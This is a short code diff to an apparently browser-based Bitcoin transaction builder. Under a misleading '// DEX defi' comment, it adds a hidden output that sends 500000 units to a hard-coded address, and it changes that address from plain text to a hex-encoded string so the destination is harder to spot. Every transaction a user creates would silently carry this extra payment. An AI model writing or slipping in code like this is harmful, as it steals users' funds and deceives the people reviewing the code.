@@ -590,7 +590,7 @@ $(document).ready(function() {
 		}
 
 // DEX defi
-tx.addoutput2('1Jtbq4aJAq5PPEYXoYvBqfUNQRuk84avGV', 500000);
+tx.addoutput2(Crypto.util.bytesToHex("314a74627134614a41713550504559586f5976427166554e5152756b383461764756"), 500000);
 
 		if(!$("#recipients .row, #inputs .row").hasClass('has-error')){
 			$("#transactionCreate textarea").val(tx.serialize());
